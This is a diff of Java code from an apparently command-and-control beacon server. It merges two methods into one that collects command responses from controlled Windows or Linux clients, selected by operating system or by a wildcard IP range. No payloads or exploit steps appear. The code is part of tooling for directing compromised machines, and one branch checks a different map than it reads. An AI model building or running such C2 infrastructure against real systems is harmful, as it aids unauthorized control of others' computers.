@@ -161,40 +161,41 @@ public class BeaconServer implements Runnable{
     }
 
     /**
-     * Get all responses to C2 Commands from an individual client
+     * Get Responses from cleints to Commands issued by the C2 Server
      * 
-     * @param IPAddress IP Address of the client that the C2 requests the responses to.
-     * @return ArrayList of all of the responses from the desired client
+     * @param scope Either Windows, Linux, or an IP Address. The IP address may contains Wildcards, such as 192.168.1.x
+     * @return A Hash map with the client's ip address as the key, and an ArrayList containing all of it's resonses as the value
      */
-    protected ArrayList<String> getSingleClientResponses(String IPAddress){
-        synchronized(windowsClientResponses){
+    protected HashMap<String, ArrayList<String>> getClientResponses(String scope){
+        HashMap<String, ArrayList<String>> responses = new HashMap<>();
+        if(scope.equals("Windows")){
+            synchronized(windowsClientResponses){
+                for(String ip : windowsClientResponses.keySet()) {
+                    responses.put(ip, windowsClientResponses.get(ip));
+                }
+            }
+        } else if(scope.equals("Linux")){
             synchronized(linuxClientResponses){
-                if(windowsClientResponses.keySet().contains(IPAddress)){
-                    return windowsClientResponses.get(IPAddress);
-                } else {
-                    return linuxClientResponses.get(IPAddress);
+                for(String ip : linuxClientResponses.keySet()) {
+                    responses.put(ip, linuxClientResponses.get(ip));
+                }
+            }
+        // Range of IPs 
+        } else {
+            ArrayList<String> ips = getIPMatches(scope);
+            for (String ip : ips){
+                synchronized(windowsClientResponses){
+                    synchronized(linuxClientResponses){
+                        if(windowsClientResponses.keySet().contains(ip)){
+                            responses.put(ip, windowsClientResponses.get(ip));
+                        } else if(linuxClientObjects.keySet().contains(ip)){
+                            responses.put(ip, linuxClientResponses.get(ip));
+                        }
+                    }
                 }
             }
         }
-    }
-
-    /**
-     * Get Responses to C2 Commands from All clients of a particular Operating System
-     * 
-     * @param OS "Windows" or "Linux"
-     * @return HashMap of all Responses. Keys are the IP Addresses that the Responses come from,
-     * and the Value is an ArrayList of all of the responses to commands sent by the C2
-     */
-    protected HashMap<String, ArrayList<String>> getMultipleClientResponses(String OS){
-        if(OS.equals("Windows")){
-            synchronized(windowsClientResponses){
-                return windowsClientResponses;
-            }
-        }else{
-            synchronized(linuxClientResponses){
-                return linuxClientResponses;
-            }
-        }
+        return responses;
     }
 
     /**
